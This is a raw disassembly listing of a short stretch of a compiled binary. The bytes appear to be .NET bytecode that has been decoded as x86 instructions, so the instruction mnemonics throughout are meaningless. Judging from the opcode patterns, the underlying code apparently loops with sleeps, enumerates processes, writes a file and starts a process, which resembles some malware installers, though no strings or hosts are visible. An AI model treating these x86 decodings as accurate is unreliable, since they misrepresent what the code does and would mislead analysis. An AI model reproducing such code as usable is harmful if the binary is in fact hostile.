  4040ed:	00 6a 30             	add    %ch,0x30(%edx)
  4040f0:	1b 02                	sbb    (%edx),%eax
  4040f2:	20 cd                	and    %cl,%ch
  4040f4:	00 00                	add    %al,(%eax)
  4040f6:	00 6f 62             	add    %ch,0x62(%edi)
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	0a 02                	or     (%edx),%al
  4040fd:	03 68 28             	add    0x28(%eax),%ebp
  404100:	29 00                	sub    %eax,(%eax)
  404102:	00 06                	add    %al,(%esi)
  404104:	16                   	push   %ss
  404105:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  404108:	00 00                	add    %al,(%eax)
  40410a:	0a 2a                	or     (%edx),%ch
  40410c:	03 15 6e 30 1b 02    	add    0x21b306e,%edx
  404112:	20 ce                	and    %cl,%dh
  404114:	00 00                	add    %al,(%eax)
  404116:	00 6f 62             	add    %ch,0x62(%edi)
  404119:	00 00                	add    %al,(%eax)
  40411b:	0a 02                	or     (%edx),%al
  40411d:	03 69 28             	add    0x28(%ecx),%ebp
  404120:	28 00                	sub    %al,(%eax)
  404122:	00 06                	add    %al,(%esi)
  404124:	16                   	push   %ss
  404125:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404128:	00 00                	add    %al,(%eax)
  40412a:	0a 2a                	or     (%edx),%ch
  40412c:	02 20                	add    (%eax),%ah
  40412e:	d3 00                	roll   %cl,(%eax)
  404130:	00 00                	add    %al,(%eax)
  404132:	6f                   	outsl  %ds:(%esi),(%dx)
  404133:	62 00                	bound  %eax,(%eax)
  404135:	00 0a                	add    %cl,(%edx)
  404137:	02 03                	add    (%ebx),%al
  404139:	28 27                	sub    %ah,(%edi)
  40413b:	00 00                	add    %al,(%eax)
  40413d:	06                   	push   %es
  40413e:	16                   	push   %ss
  40413f:	1e                   	push   %ds
  404140:	6f                   	outsl  %ds:(%esi),(%dx)
  404141:	4c                   	dec    %esp
  404142:	00 00                	add    %al,(%eax)
  404144:	0a 2a                	or     (%edx),%ch
  404146:	03 20                	add    (%eax),%esp
  404148:	00 00                	add    %al,(%eax)
  40414a:	00 80 6a 30 1a 02    	add    %al,0x21a306a(%eax)
  404150:	20 d3                	and    %dl,%bl
  404152:	00 00                	add    %al,(%eax)
  404154:	00 6f 62             	add    %ch,0x62(%edi)
  404157:	00 00                	add    %al,(%eax)
  404159:	0a 02                	or     (%edx),%al
  40415b:	03 28                	add    (%eax),%ebp
  40415d:	27                   	daa
  40415e:	00 00                	add    %al,(%eax)
  404160:	06                   	push   %es
  404161:	16                   	push   %ss
  404162:	1e                   	push   %ds
  404163:	6f                   	outsl  %ds:(%esi),(%dx)
  404164:	4c                   	dec    %esp
  404165:	00 00                	add    %al,(%eax)
  404167:	0a 2a                	or     (%edx),%ch
  404169:	03 20                	add    (%eax),%esp
  40416b:	00 80 ff ff 6a 30    	add    %al,0x306affff(%eax)
  404171:	1b 02                	sbb    (%edx),%eax
  404173:	20 d2                	and    %dl,%dl
  404175:	00 00                	add    %al,(%eax)
  404177:	00 6f 62             	add    %ch,0x62(%edi)
  40417a:	00 00                	add    %al,(%eax)
  40417c:	0a 02                	or     (%edx),%al
  40417e:	03 69 28             	add    0x28(%ecx),%ebp
  404181:	28 00                	sub    %al,(%eax)
  404183:	00 06                	add    %al,(%esi)
  404185:	16                   	push   %ss
  404186:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404189:	00 00                	add    %al,(%eax)
  40418b:	0a 2a                	or     (%edx),%ch
  40418d:	03 1f                	add    (%edi),%ebx
  40418f:	80 6a 30 1b          	subb   $0x1b,0x30(%edx)
  404193:	02 20                	add    (%eax),%ah
  404195:	d1 00                	roll   $1,(%eax)
  404197:	00 00                	add    %al,(%eax)
  404199:	6f                   	outsl  %ds:(%esi),(%dx)
  40419a:	62 00                	bound  %eax,(%eax)
  40419c:	00 0a                	add    %cl,(%edx)
  40419e:	02 03                	add    (%ebx),%al
  4041a0:	68 28 29 00 00       	push   $0x2928
  4041a5:	06                   	push   %es
  4041a6:	16                   	push   %ss
  4041a7:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4041aa:	00 00                	add    %al,(%eax)
  4041ac:	0a 2a                	or     (%edx),%ch
  4041ae:	03 1f                	add    (%edi),%ebx
  4041b0:	e0 6a                	loopne 0x40421c
  4041b2:	30 14 02             	xor    %dl,(%edx,%eax,1)
  4041b5:	20 d0                	and    %dl,%al
  4041b7:	00 00                	add    %al,(%eax)
  4041b9:	00 6f 62             	add    %ch,0x62(%edi)
  4041bc:	00 00                	add    %al,(%eax)
  4041be:	0a 02                	or     (%edx),%al
  4041c0:	03 d2                	add    %edx,%edx
  4041c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c3:	62 00                	bound  %eax,(%eax)
  4041c5:	00 0a                	add    %cl,(%edx)
  4041c7:	2a 02                	sub    (%edx),%al
  4041c9:	03 d2                	add    %edx,%edx
  4041cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041cc:	62 00                	bound  %eax,(%eax)
  4041ce:	00 0a                	add    %cl,(%edx)
  4041d0:	2a 00                	sub    (%eax),%al
  4041d2:	00 00                	add    %al,(%eax)
  4041d4:	1b 30                	sbb    (%eax),%esi
  4041d6:	06                   	push   %es
  4041d7:	00 b9 02 00 00 17    	add    %bh,0x17000002(%ecx)
  4041dd:	00 00                	add    %al,(%eax)
  4041df:	11 7e 05             	adc    %edi,0x5(%esi)
  4041e2:	00 00                	add    %al,(%eax)
  4041e4:	04 28                	add    $0x28,%al
  4041e6:	85 00                	test   %eax,(%eax)
  4041e8:	00 0a                	add    %cl,(%edx)
  4041ea:	7e 06                	jle    0x4041f2
  4041ec:	00 00                	add    %al,(%eax)
  4041ee:	04 28                	add    $0x28,%al
  4041f0:	86 00                	xchg   %al,(%eax)
  4041f2:	00 0a                	add    %cl,(%edx)
  4041f4:	73 87                	jae    0x40417d
  4041f6:	00 00                	add    %al,(%eax)
  4041f8:	0a 0a                	or     (%edx),%cl
  4041fa:	28 88 00 00 0a 6f    	sub    %cl,0x6f0a0000(%eax)
  404200:	89 00                	mov    %eax,(%eax)
  404202:	00 0a                	add    %cl,(%edx)
  404204:	6f                   	outsl  %ds:(%esi),(%dx)
  404205:	8a 00                	mov    (%eax),%al
  404207:	00 0a                	add    %cl,(%edx)
  404209:	06                   	push   %es
  40420a:	6f                   	outsl  %ds:(%esi),(%dx)
  40420b:	8b 00                	mov    (%eax),%eax
  40420d:	00 0a                	add    %cl,(%edx)
  40420f:	28 8c 00 00 0a 39 7a 	sub    %cl,0x7a390a00(%eax,%eax,1)
  404216:	02 00                	add    (%eax),%al
  404218:	00 16                	add    %dl,(%esi)
  40421a:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  40421d:	10 20                	adc    %ah,(%eax)
  40421f:	e8 03 00 00 28       	call   0x28404227
  404224:	14 00                	adc    $0x0,%al
  404226:	00 0a                	add    %cl,(%edx)
  404228:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40422b:	58                   	pop    %eax
  40422c:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40422f:	04 1f                	add    $0x1f,%al
  404231:	0a 32                	or     (%edx),%dh
  404233:	ea 28 8d 00 00 0a 13 	ljmp   $0x130a,$0x8d28
  40423a:	05 16 13 06 2b       	add    $0x2b061316,%eax
  40423f:	32 11                	xor    (%ecx),%dl
  404241:	05 11 06 9a 13       	add    $0x139a0611,%eax
  404246:	07                   	pop    %es
  404247:	11 07                	adc    %eax,(%edi)
  404249:	6f                   	outsl  %ds:(%esi),(%dx)
  40424a:	89 00                	mov    %eax,(%eax)
  40424c:	00 0a                	add    %cl,(%edx)
  40424e:	6f                   	outsl  %ds:(%esi),(%dx)
  40424f:	8a 00                	mov    (%eax),%al
  404251:	00 0a                	add    %cl,(%edx)
  404253:	06                   	push   %es
  404254:	6f                   	outsl  %ds:(%esi),(%dx)
  404255:	8b 00                	mov    (%eax),%eax
  404257:	00 0a                	add    %cl,(%edx)
  404259:	28 27                	sub    %ah,(%edi)
  40425b:	00 00                	add    %al,(%eax)
  40425d:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404260:	11 07                	adc    %eax,(%edi)
  404262:	6f                   	outsl  %ds:(%esi),(%dx)
  404263:	8e 00                	mov    (%eax),%es
  404265:	00 0a                	add    %cl,(%edx)
  404267:	de 03                	fiadds (%ebx)
  404269:	26 de 00             	fiadds %es:(%eax)
  40426c:	11 06                	adc    %eax,(%esi)
  40426e:	17                   	pop    %ss
  40426f:	58                   	pop    %eax
  404270:	13 06                	adc    (%esi),%eax
  404272:	11 06                	adc    %eax,(%esi)
  404274:	11 05 8e 69 32 c6    	adc    %eax,0xc632698e
  40427a:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404280:	7e 73                	jle    0x4042f5
  404282:	8f 00                	pop    (%eax)
  404284:	00 0a                	add    %cl,(%edx)
  404286:	13 08                	adc    (%eax),%ecx
  404288:	11 08                	adc    %ecx,(%eax)
  40428a:	73 90                	jae    0x40421c
  40428c:	00 00                	add    %al,(%eax)
  40428e:	0a 13                	or     (%ebx),%dl
  404290:	09 11                	or     %edx,(%ecx)
  404292:	09 72 41             	or     %esi,0x41(%edx)
  404295:	21 00                	and    %eax,(%eax)
  404297:	70 6f                	jo     0x404308
  404299:	91                   	xchg   %eax,%ecx
  40429a:	00 00                	add    %al,(%eax)
  40429c:	0a 11                	or     (%ecx),%dl
  40429e:	09 1b                	or     %ebx,(%ebx)
  4042a0:	8d 39                	lea    (%ecx),%edi
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	01 25 16 72 5b 21    	add    %esp,0x215b7216
  4042aa:	00 70 a2             	add    %dh,-0x5e(%eax)
  4042ad:	25 17 06 6f 8b       	and    $0x8b6f0617,%eax
  4042b2:	00 00                	add    %al,(%eax)
  4042b4:	0a 28                	or     (%eax),%ch
  4042b6:	92                   	xchg   %eax,%edx
  4042b7:	00 00                	add    %al,(%eax)
  4042b9:	0a a2 25 18 72 af    	or     -0x508de7db(%edx),%ah
  4042bf:	21 00                	and    %eax,(%eax)
  4042c1:	70 a2                	jo     0x404265
  4042c3:	25 19 06 6f 8b       	and    $0x8b6f0619,%eax
  4042c8:	00 00                	add    %al,(%eax)
  4042ca:	0a a2 25 1a 72 c3    	or     -0x3c8de5db(%edx),%ah
  4042d0:	21 00                	and    %eax,(%eax)
  4042d2:	70 a2                	jo     0x404276
  4042d4:	28 93 00 00 0a 6f    	sub    %dl,0x6f0a0000(%ebx)
  4042da:	94                   	xchg   %eax,%esp
  4042db:	00 00                	add    %al,(%eax)
  4042dd:	0a 11                	or     (%ecx),%dl
  4042df:	09 17                	or     %edx,(%edi)
  4042e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4042e2:	95                   	xchg   %eax,%ebp
  4042e3:	00 00                	add    %al,(%eax)
  4042e5:	0a 11                	or     (%ecx),%dl
  4042e7:	09 17                	or     %edx,(%edi)
  4042e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4042ea:	96                   	xchg   %eax,%esi
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	0a 11                	or     (%ecx),%dl
  4042ef:	09 6f 97             	or     %ebp,-0x69(%edi)
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	0a 11                	or     (%ecx),%dl
  4042f6:	08 6f 98             	or     %ch,-0x68(%edi)
  4042f9:	00 00                	add    %al,(%eax)
  4042fb:	0a 26                	or     (%esi),%ah
  4042fd:	2b 4c 7e 99          	sub    -0x67(%esi,%edi,2),%ecx
  404301:	00 00                	add    %al,(%eax)
  404303:	0a 72 c9             	or     -0x37(%edx),%dh
  404306:	21 00                	and    %eax,(%eax)
  404308:	70 28                	jo     0x404332
  40430a:	9a 00 00 0a 18 6f 9b 	lcall  $0x9b6f,$0x180a0000
  404311:	00 00                	add    %al,(%eax)
  404313:	0a 13                	or     (%ebx),%dl
  404315:	0a 11                	or     (%ecx),%dl
  404317:	0a 06                	or     (%esi),%al
  404319:	6f                   	outsl  %ds:(%esi),(%dx)
  40431a:	8b 00                	mov    (%eax),%eax
  40431c:	00 0a                	add    %cl,(%edx)
  40431e:	28 92 00 00 0a 72    	sub    %dl,0x720a0000(%edx)
  404324:	27                   	daa
  404325:	22 00                	and    (%eax),%al
  404327:	70 06                	jo     0x40432f
  404329:	6f                   	outsl  %ds:(%esi),(%dx)
  40432a:	8b 00                	mov    (%eax),%eax
  40432c:	00 0a                	add    %cl,(%edx)
  40432e:	72 27                	jb     0x404357
  404330:	22 00                	and    (%eax),%al
  404332:	70 28                	jo     0x40435c
  404334:	9c                   	pushf
  404335:	00 00                	add    %al,(%eax)
  404337:	0a 6f 9d             	or     -0x63(%edi),%ch
  40433a:	00 00                	add    %al,(%eax)
  40433c:	0a de                	or     %dh,%bl
  40433e:	0c 11                	or     $0x11,%al
  404340:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404343:	11 0a                	adc    %ecx,(%edx)
  404345:	6f                   	outsl  %ds:(%esi),(%dx)
  404346:	33 00                	xor    (%eax),%eax
  404348:	00 0a                	add    %cl,(%edx)
  40434a:	dc 06                	faddl  (%esi)
  40434c:	6f                   	outsl  %ds:(%esi),(%dx)
  40434d:	8b 00                	mov    (%eax),%eax
  40434f:	00 0a                	add    %cl,(%edx)
  404351:	28 73 00             	sub    %dh,0x0(%ebx)
  404354:	00 0a                	add    %cl,(%edx)
  404356:	2c 15                	sub    $0x15,%al
  404358:	06                   	push   %es
  404359:	6f                   	outsl  %ds:(%esi),(%dx)
  40435a:	8b 00                	mov    (%eax),%eax
  40435c:	00 0a                	add    %cl,(%edx)
  40435e:	28 9e 00 00 0a 20    	sub    %bl,0x200a0000(%esi)
  404364:	e8 03 00 00 28       	call   0x2840436c
  404369:	14 00                	adc    $0x0,%al
  40436b:	00 0a                	add    %cl,(%edx)
  40436d:	06                   	push   %es
  40436e:	6f                   	outsl  %ds:(%esi),(%dx)
  40436f:	8b 00                	mov    (%eax),%eax
  404371:	00 0a                	add    %cl,(%edx)
  404373:	17                   	pop    %ss
  404374:	73 77                	jae    0x4043ed
  404376:	00 00                	add    %al,(%eax)
  404378:	0a 28                	or     (%eax),%ch
  40437a:	88 00                	mov    %al,(%eax)
  40437c:	00 0a                	add    %cl,(%edx)
  40437e:	6f                   	outsl  %ds:(%esi),(%dx)
  40437f:	89 00                	mov    %eax,(%eax)
  404381:	00 0a                	add    %cl,(%edx)
  404383:	6f                   	outsl  %ds:(%esi),(%dx)
  404384:	8a 00                	mov    (%eax),%al
  404386:	00 0a                	add    %cl,(%edx)
  404388:	28 9f 00 00 0a 0b    	sub    %bl,0xb0a0000(%edi)
  40438e:	25 07 16 07 8e       	and    $0x8e071607,%eax
  404393:	69 6f 4c 00 00 0a 73 	imul   $0x730a0000,0x4c(%edi),%ebp
  40439a:	18 00                	sbb    %al,(%eax)
  40439c:	00 0a                	add    %cl,(%edx)
  40439e:	20 00                	and    %al,(%eax)
  4043a0:	00 71 02             	add    %dh,0x2(%ecx)
  4043a3:	20 00                	and    %al,(%eax)
  4043a5:	40                   	inc    %eax
  4043a6:	0d 03 6f 19 00       	or     $0x196f03,%eax
  4043ab:	00 0a                	add    %cl,(%edx)
  4043ad:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4043b1:	01 0c 73             	add    %ecx,(%ebx,%esi,2)
  4043b4:	18 00                	sbb    %al,(%eax)
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	08 6f a0             	or     %ch,-0x60(%edi)
  4043bb:	00 00                	add    %al,(%eax)
  4043bd:	0a 25 08 16 08 8e    	or     0x8e081608,%ah
  4043c3:	69 6f 4c 00 00 0a 6f 	imul   $0x6f0a0000,0x4c(%edi),%ebp
  4043ca:	41                   	inc    %ecx
  4043cb:	00 00                	add    %al,(%eax)
  4043cd:	0a 28                	or     (%eax),%ch
  4043cf:	82 00 00             	addb   $0x0,(%eax)
  4043d2:	06                   	push   %es
  4043d3:	28 a1 00 00 0a 72    	sub    %ah,0x720a0000(%ecx)
  4043d9:	2b 22                	sub    (%edx),%esp
  4043db:	00 70 28             	add    %dh,0x28(%eax)
  4043de:	51                   	push   %ecx
  4043df:	00 00                	add    %al,(%eax)
  4043e1:	0a 0d 09 73 a2 00    	or     0xa27309,%cl
  4043e7:	00 0a                	add    %cl,(%edx)
  4043e9:	13 0b                	adc    (%ebx),%ecx
  4043eb:	11 0b                	adc    %ecx,(%ebx)
  4043ed:	72 35                	jb     0x404424
  4043ef:	22 00                	and    (%eax),%al
  4043f1:	70 6f                	jo     0x404462
  4043f3:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  4043f8:	0b 72 49             	or     0x49(%edx),%esi
  4043fb:	22 00                	and    (%eax),%al
  4043fd:	70 6f                	jo     0x40446e
  4043ff:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  404404:	0b 72 69             	or     0x69(%edx),%esi
  404407:	22 00                	and    (%eax),%al
  404409:	70 06                	jo     0x404411
  40440b:	6f                   	outsl  %ds:(%esi),(%dx)
  40440c:	8b 00                	mov    (%eax),%eax
  40440e:	00 0a                	add    %cl,(%edx)
  404410:	72 27                	jb     0x404439
  404412:	22 00                	and    (%eax),%al
  404414:	70 28                	jo     0x40443e
  404416:	9c                   	pushf
  404417:	00 00                	add    %al,(%eax)
  404419:	0a 6f a3             	or     -0x5d(%edi),%ch
  40441c:	00 00                	add    %al,(%eax)
  40441e:	0a 11                	or     (%ecx),%dl
  404420:	0b 72 7f             	or     0x7f(%edx),%esi
  404423:	22 00                	and    (%eax),%al
  404425:	70 28                	jo     0x40444f
  404427:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404428:	00 00                	add    %al,(%eax)
  40442a:	0a 28                	or     (%eax),%ch
  40442c:	51                   	push   %ecx
  40442d:	00 00                	add    %al,(%eax)
  40442f:	0a 6f a3             	or     -0x5d(%edi),%ch
  404432:	00 00                	add    %al,(%eax)
  404434:	0a 11                	or     (%ecx),%dl
  404436:	0b 72 87             	or     -0x79(%edx),%esi
  404439:	22 00                	and    (%eax),%al
  40443b:	70 09                	jo     0x404446
  40443d:	28 a5 00 00 0a 72    	sub    %ah,0x720a0000(%ebp)
  404443:	93                   	xchg   %eax,%ebx
  404444:	22 00                	and    (%eax),%al
  404446:	70 28                	jo     0x404470
  404448:	9c                   	pushf
  404449:	00 00                	add    %al,(%eax)
  40444b:	0a 6f a3             	or     -0x5d(%edi),%ch
  40444e:	00 00                	add    %al,(%eax)
  404450:	0a de                	or     %dh,%bl
  404452:	0c 11                	or     $0x11,%al
  404454:	0b 2c 07             	or     (%edi,%eax,1),%ebp
  404457:	11 0b                	adc    %ecx,(%ebx)
  404459:	6f                   	outsl  %ds:(%esi),(%dx)
  40445a:	33 00                	xor    (%eax),%eax
  40445c:	00 0a                	add    %cl,(%edx)
  40445e:	dc 73 90             	fdivl  -0x70(%ebx)
  404461:	00 00                	add    %al,(%eax)
  404463:	0a 25 09 6f 91 00    	or     0x916f09,%ah
  404469:	00 0a                	add    %cl,(%edx)
  40446b:	25 17 6f 96 00       	and    $0x966f17,%eax
  404470:	00 0a                	add    %cl,(%edx)
  404472:	25 16 6f a6 00       	and    $0xa66f16,%eax
  404477:	00 0a                	add    %cl,(%edx)
  404479:	25 16 6f a7 00       	and    $0xa76f16,%eax
  40447e:	00 0a                	add    %cl,(%edx)
  404480:	25 17 6f 95 00       	and    $0x956f17,%eax
  404485:	00 0a                	add    %cl,(%edx)
  404487:	28 a8 00 00 0a 26    	sub    %ch,0x260a0000(%eax)
  40448d:	16                   	push   %ss
  40448e:	28 16                	sub    %dl,(%esi)
  404490:	00 00                	add    %al,(%eax)
  404492:	0a de                	or     %dh,%bl
  404494:	03 26                	add    (%esi),%esp
  404496:	de 00                	fiadds (%eax)
  404498:	2a 00                	sub    (%eax),%al
  40449a:	00 00                	add    %al,(%eax)
  40449c:	41                   	inc    %ecx
  40449d:	64 00 00             	add    %al,%fs:(%eax)
  4044a0:	00 00                	add    %al,(%eax)
  4044a2:	00 00                	add    %al,(%eax)
  4044a4:	67 00 00             	add    %al,(%bx,%si)
  4044a7:	00 22                	add    %ah,(%edx)
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	00 89 00 00 00 03    	add    %cl,0x3000000(%ecx)
  4044b1:	00 00                	add    %al,(%eax)
  4044b3:	00 01                	add    %al,(%ecx)
  4044b5:	00 00                	add    %al,(%eax)
  4044b7:	01 02                	add    %eax,(%edx)
  4044b9:	00 00                	add    %al,(%eax)
  4044bb:	00 36                	add    %dh,(%esi)
  4044bd:	01 00                	add    %eax,(%eax)
  4044bf:	00 29                	add    %ch,(%ecx)
  4044c1:	00 00                	add    %al,(%eax)
  4044c3:	00 5f 01             	add    %bl,0x1(%edi)
  4044c6:	00 00                	add    %al,(%eax)
  4044c8:	0c 00                	or     $0x0,%al
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	00 00                	add    %al,(%eax)
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	02 00                	add    (%eax),%al
  4044d2:	00 00                	add    %al,(%eax)
  4044d4:	0b 02                	or     (%edx),%eax
  4044d6:	00 00                	add    %al,(%eax)
  4044d8:	68 00 00 00 73       	push   $0x73000000
  4044dd:	02 00                	add    (%eax),%al
  4044df:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	b5 02                	mov    $0x2,%ch
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	b5 02                	mov    $0x2,%ch
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	03 00                	add    (%eax),%eax
  4044fa:	00 00                	add    %al,(%eax)
  4044fc:	32 00                	xor    (%eax),%al
  4044fe:	00 01                	add    %al,(%ecx)
  404500:	1b 30                	sbb    (%eax),%esi
  404502:	02 00                	add    (%eax),%al
  404504:	2e 00 00             	add    %al,%cs:(%eax)
  404507:	00 18                	add    %bl,(%eax)
  404509:	00 00                	add    %al,(%eax)
  40450b:	11 21                	adc    %esp,(%ecx)
  40450d:	00 22                	add    %ah,(%edx)
  40450f:	e2 33                	loop   0x404544
  404511:	0e                   	push   %cs
  404512:	00 00                	add    %al,(%eax)
  404514:	00 0a                	add    %cl,(%edx)
  404516:	28 aa 00 00 0a 28    	sub    %ch,0x280a0000(%edx)
  40451c:	ab                   	stos   %eax,%es:(%edi)
  40451d:	00 00                	add    %al,(%eax)
  40451f:	0a 73 ac             	or     -0x54(%ebx),%dh
  404522:	00 00                	add    %al,(%eax)
  404524:	0a 28                	or     (%eax),%ch
  404526:	ad                   	lods   %ds:(%esi),%eax
  404527:	00 00                	add    %al,(%eax)
  404529:	0a 06                	or     (%esi),%al
  40452b:	30 04 17             	xor    %al,(%edi,%edx,1)
  40452e:	0b de                	or     %esi,%ebx
  404530:	07                   	pop    %es
  404531:	de 03                	fiadds (%ebx)
  404533:	26 de 00             	fiadds %es:(%eax)
  404536:	16                   	push   %ss
  404537:	2a 07                	sub    (%edi),%al
  404539:	2a 00                	sub    (%eax),%al
  40453b:	00 01                	add    %al,(%ecx)
  40453d:	10 00                	adc    %al,(%eax)
  40453f:	00 00                	add    %al,(%eax)
  404541:	00 00                	add    %al,(%eax)
  404543:	00 27                	add    %ah,(%edi)
  404545:	27                   	daa
  404546:	00 03                	add    %al,(%ebx)
  404548:	01 00                	add    %eax,(%eax)
  40454a:	00 01                	add    %al,(%ecx)
  40454c:	1b 30                	sbb    (%eax),%esi
  40454e:	02 00                	add    (%eax),%al
  404550:	28 00                	sub    %al,(%eax)
  404552:	00 00                	add    %al,(%eax)
  404554:	02 00                	add    (%eax),%al
  404556:	00 11                	add    %dl,(%ecx)
  404558:	73 ae                	jae    0x404508
  40455a:	00 00                	add    %al,(%eax)
  40455c:	0a 28                	or     (%eax),%ch
  40455e:	af                   	scas   %es:(%edi),%eax
  40455f:	00 00                	add    %al,(%eax)
  404561:	0a 6f 5b             	or     0x5b(%edi),%ch
  404564:	00 00                	add    %al,(%eax)
  404566:	0a 72 a3             	or     -0x5d(%edx),%dh
  404569:	22 00                	and    (%eax),%al
  40456b:	70 6f                	jo     0x4045dc
  40456d:	b0 00                	mov    $0x0,%al
  40456f:	00 0a                	add    %cl,(%edx)
  404571:	2c 04                	sub    $0x4,%al
  404573:	17                   	pop    %ss
  404574:	0a de                	or     %dh,%bl
  404576:	07                   	pop    %es
  404577:	de 03                	fiadds (%ebx)
  404579:	26 de 00             	fiadds %es:(%eax)
  40457c:	16                   	push   %ss
  40457d:	2a 06                	sub    (%esi),%al
  40457f:	2a 01                	sub    (%ecx),%al
  404581:	10 00                	adc    %al,(%eax)
  404583:	00 00                	add    %al,(%eax)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 21                	add    %ah,(%ecx)
  404589:	21 00                	and    %eax,(%eax)
  40458b:	03 01                	add    (%ecx),%eax
  40458d:	00 00                	add    %al,(%eax)
  40458f:	01 1b                	add    %ebx,(%ebx)
  404591:	30 02                	xor    %al,(%edx)
  404593:	00 d0                	add    %dl,%al
  404595:	00 00                	add    %al,(%eax)
  404597:	00 19                	add    %bl,(%ecx)
  404599:	00 00                	add    %al,(%eax)
  40459b:	11 72 a9             	adc    %esi,-0x57(%edx)
  40459e:	22 00                	and    (%eax),%al
  4045a0:	70 73                	jo     0x404615
  4045a2:	b1 00                	mov    $0x0,%cl
  4045a4:	00 0a                	add    %cl,(%edx)
  4045a6:	0a 06                	or     (%esi),%al
  4045a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045a9:	b2 00                	mov    $0x0,%dl
  4045ab:	00 0a                	add    %cl,(%edx)
  4045ad:	0b 07                	or     (%edi),%eax
  4045af:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b0:	b3 00                	mov    $0x0,%bl
  4045b2:	00 0a                	add    %cl,(%edx)
  4045b4:	0c 2b                	or     $0x2b,%al
  4045b6:	7c 08                	jl     0x4045c0
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	b4 00                	mov    $0x0,%ah
  4045bb:	00 0a                	add    %cl,(%edx)
  4045bd:	0d 09 72 ef 22       	or     $0x22ef7209,%eax
  4045c2:	00 70 6f             	add    %dh,0x6f(%eax)
  4045c5:	b5 00                	mov    $0x0,%ch
  4045c7:	00 0a                	add    %cl,(%edx)
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	38 00                	cmp    %al,(%eax)
  4045cc:	00 0a                	add    %cl,(%edx)
  4045ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4045cf:	5b                   	pop    %ebx
  4045d0:	00 00                	add    %al,(%eax)
  4045d2:	0a 13                	or     (%ebx),%dl
  4045d4:	04 11                	add    $0x11,%al
  4045d6:	04 72                	add    $0x72,%al
  4045d8:	09 23                	or     %esp,(%ebx)
  4045da:	00 70 28             	add    %dh,0x28(%eax)
  4045dd:	27                   	daa
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	0a 2c 21             	or     (%ecx,%eiz,1),%ch
  4045e3:	09 72 35             	or     %esi,0x35(%edx)
  4045e6:	23 00                	and    (%eax),%eax
  4045e8:	70 6f                	jo     0x404659
  4045ea:	b5 00                	mov    $0x0,%ch
  4045ec:	00 0a                	add    %cl,(%edx)
  4045ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ef:	38 00                	cmp    %al,(%eax)
  4045f1:	00 0a                	add    %cl,(%edx)
  4045f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f4:	b6 00                	mov    $0x0,%dh
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	72 41                	jb     0x40463b
  4045fa:	23 00                	and    (%eax),%eax
  4045fc:	70 6f                	jo     0x40466d
  4045fe:	b0 00                	mov    $0x0,%al
  404600:	00 0a                	add    %cl,(%edx)
  404602:	2d 2a 11 04 72       	sub    $0x7204112a,%eax
  404607:	51                   	push   %ecx
  404608:	23 00                	and    (%eax),%eax
  40460a:	70 6f                	jo     0x40467b
  40460c:	b0 00                	mov    $0x0,%al
  40460e:	00 0a                	add    %cl,(%edx)
  404610:	2d 1c 09 72 35       	sub    $0x3572091c,%eax
  404615:	23 00                	and    (%eax),%eax
  404617:	70 6f                	jo     0x404688
  404619:	b5 00                	mov    $0x0,%ch
  40461b:	00 0a                	add    %cl,(%edx)
  40461d:	6f                   	outsl  %ds:(%esi),(%dx)
  40461e:	38 00                	cmp    %al,(%eax)
  404620:	00 0a                	add    %cl,(%edx)
  404622:	72 5f                	jb     0x404683
  404624:	23 00                	and    (%eax),%eax
  404626:	70 28                	jo     0x404650
  404628:	27                   	daa
  404629:	00 00                	add    %al,(%eax)
  40462b:	0a 2c 05 17 13 05 de 	or     -0x21faece9(,%eax,1),%ch
  404632:	36 08 6f b7          	or     %ch,%ss:-0x49(%edi)
  404636:	00 00                	add    %al,(%eax)
  404638:	0a 3a                	or     (%edx),%bh
  40463a:	79 ff                	jns    0x40463b
  40463c:	ff                   	(bad)
  40463d:	ff                   	lcall  (bad)
  40463e:	de 0a                	fimuls (%edx)
  404640:	08 2c 06             	or     %ch,(%esi,%eax,1)
  404643:	08 6f 33             	or     %ch,0x33(%edi)
  404646:	00 00                	add    %al,(%eax)
  404648:	0a dc                	or     %ah,%bl
  40464a:	de 0a                	fimuls (%edx)
  40464c:	07                   	pop    %es
  40464d:	2c 06                	sub    $0x6,%al
  40464f:	07                   	pop    %es
  404650:	6f                   	outsl  %ds:(%esi),(%dx)
  404651:	33 00                	xor    (%eax),%eax
  404653:	00 0a                	add    %cl,(%edx)
  404655:	dc de                	(bad)
  404657:	0a 06                	or     (%esi),%al
  404659:	2c 06                	sub    $0x6,%al
  40465b:	06                   	push   %es
  40465c:	6f                   	outsl  %ds:(%esi),(%dx)
